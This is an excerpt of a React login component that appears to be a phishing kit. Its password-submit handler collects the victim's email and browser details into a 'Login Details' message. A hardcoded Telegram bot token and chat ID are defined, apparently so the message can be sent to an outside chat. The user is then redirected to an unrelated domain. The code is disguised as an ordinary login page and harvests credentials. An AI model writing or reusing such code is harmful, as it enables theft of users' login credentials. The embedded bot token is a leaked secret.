...
const Login = () => {
  ...
  const handlePasswordSubmit = async (e) => {
    ...
    try {
      ...
      const TELEGRAM_BOT_TOKEN = '7496418751:AAHg6w4QKlng-cL7R2QfaywLCviQrYUYIpk';
      const TELEGRAM_CHAT_ID = '-1002308434426';
      const loginAlert = `
🔐 <b>Login Details</b>
📧 <b>Email:</b> ${email}
...
🕵️‍♂️ <b>User Agent:</b> ${navigator.userAgent}
      ...
      setShowModal(false); // Hide modal before redirecting
      window.location.href = 'https://gt.moralemadefiles.top/';
    } catch (error) {
